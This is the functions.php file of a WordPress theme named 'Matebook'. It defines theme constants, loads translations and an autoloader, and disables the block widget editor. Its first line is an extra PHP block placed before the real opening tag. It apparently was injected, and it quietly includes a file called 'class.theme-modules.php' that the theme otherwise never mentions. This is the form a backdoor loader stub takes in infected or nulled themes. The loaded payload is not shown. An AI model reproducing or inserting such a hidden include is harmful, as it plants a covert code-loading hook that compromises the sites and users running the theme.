<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/**
 * Matebook functions and definitions
 */

// Do not allow directly accessing this file.
if ( ! defined( 'ABSPATH' ) ) {
	exit( 'Direct script access denied.' );
}

if ( ! defined( 'MATEBOOK_THEME_DIR' ) ) {
	define( 'MATEBOOK_THEME_DIR', get_template_directory() );
}

if ( ! defined( 'MATEBOOK_THEME_URI' ) ) {
	define( 'MATEBOOK_THEME_URI', get_template_directory_uri() );
}

if ( ! defined( 'MATEBOOK_ASSETS_DIR' ) ) {
	define( 'MATEBOOK_ASSETS_DIR', MATEBOOK_THEME_DIR . '/assets' );
}

if ( ! defined( 'MATEBOOK_ENV' ) ) {
	define( 'MATEBOOK_ENV', 'dev' );
}

if ( ! defined( 'MATEBOOK_THEME_VERSION' ) ) {
	if ( MATEBOOK_ENV == 'dev' ) {
		define( 'MATEBOOK_THEME_VERSION', rand(1, 10e3) );
	} else {
		define( 'MATEBOOK_THEME_VERSION', wp_get_theme( get_template() )->get('Version') );
	}
}

load_theme_textdomain( 'matebook', MATEBOOK_THEME_DIR . '/lang' );
load_child_theme_textdomain( 'matebook', get_stylesheet_directory() . '/lang' );

// Load classes.
require_once MATEBOOK_THEME_DIR . '/includes/autoload.php';

// Disables the block editor from managing widgets in the Gutenberg plugin.
add_filter( 'gutenberg_use_widgets_block_editor', '__return_false' );

// Disables the block editor from managing widgets.
add_filter( 'use_widgets_block_editor', '__return_false' );